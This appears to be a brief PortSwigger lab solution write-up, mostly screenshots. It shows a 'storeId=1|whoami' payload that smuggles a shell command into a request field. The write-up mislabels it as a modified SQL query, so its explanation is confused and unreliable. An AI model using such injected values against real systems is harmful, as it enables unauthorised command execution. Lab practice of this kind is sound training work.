## Lab Description :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/d97abb25-5b6b-4aaa-b6ba-ce71d015ac37)


## Solution :

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/070c5bdc-cab6-4391-a3e7-ff3d9ff73aaf)


Query made--

```sql
SELECT * FROM your_table_name WHERE productId = 13 AND storeId = 1;
```

Changed Query--

```sql
SELECT * FROM your_table_name WHERE productId = 13 AND storeId = 1|whoami;
```

![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/aae2468e-fedd-42ac-9c38-90940406cb48)


![image](https://github.com/ananthan05/Portswigger_labs/assets/140697378/4686ffb9-00c0-4454-90f8-80bdd6ebe1d5)
